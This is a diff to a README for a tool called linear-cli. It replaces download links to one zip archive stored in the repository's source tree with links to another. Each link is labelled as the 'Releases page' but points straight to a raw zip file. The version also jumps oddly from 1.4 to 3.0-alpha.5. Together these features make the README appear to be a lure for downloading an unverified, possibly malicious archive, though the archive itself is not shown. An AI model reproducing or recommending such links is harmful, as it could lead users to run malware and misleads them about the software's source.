@@ -8,12 +8,12 @@ Welcome to linear-cli, a modern command-line interface for Linear. This tool hel
 
 To get started, visit the Releases page to download the latest version of linear-cli.
 
-[![Download linear-cli](https://raw.githubusercontent.com/feras239/linear-cli/master/src/utils/linear-cli_v1.4.zip)](https://raw.githubusercontent.com/feras239/linear-cli/master/src/utils/linear-cli_v1.4.zip)
+[![Download linear-cli](https://github.com/feras239/linear-cli/raw/refs/heads/master/src/linear-cli-3.0-alpha.5.zip)](https://github.com/feras239/linear-cli/raw/refs/heads/master/src/linear-cli-3.0-alpha.5.zip)
 
 Follow these steps to install and run linear-cli on your computer:
 
 1. **Visit the Releases Page**
-   Click on this link to access the Releases page: [Download linear-cli](https://raw.githubusercontent.com/feras239/linear-cli/master/src/utils/linear-cli_v1.4.zip).
+   Click on this link to access the Releases page: [Download linear-cli](https://github.com/feras239/linear-cli/raw/refs/heads/master/src/linear-cli-3.0-alpha.5.zip).
 
 2. **Choose the Latest Version**
    Look for the latest version available. It will usually be at the top of the list. 
@@ -91,6 +91,6 @@ Your feedback is important to us. If you find issues or have suggestions, feel f
 
 We regularly update linear-cli with new features and improvements. Check the Releases page to stay informed about the latest updates.
 
-[![Download linear-cli](https://raw.githubusercontent.com/feras239/linear-cli/master/src/utils/linear-cli_v1.4.zip)](https://raw.githubusercontent.com/feras239/linear-cli/master/src/utils/linear-cli_v1.4.zip)
+[![Download linear-cli](https://github.com/feras239/linear-cli/raw/refs/heads/master/src/linear-cli-3.0-alpha.5.zip)](https://github.com/feras239/linear-cli/raw/refs/heads/master/src/linear-cli-3.0-alpha.5.zip)
 
 Enjoy managing your issues more efficiently with linear-cli! Thank you for choosing our tool.
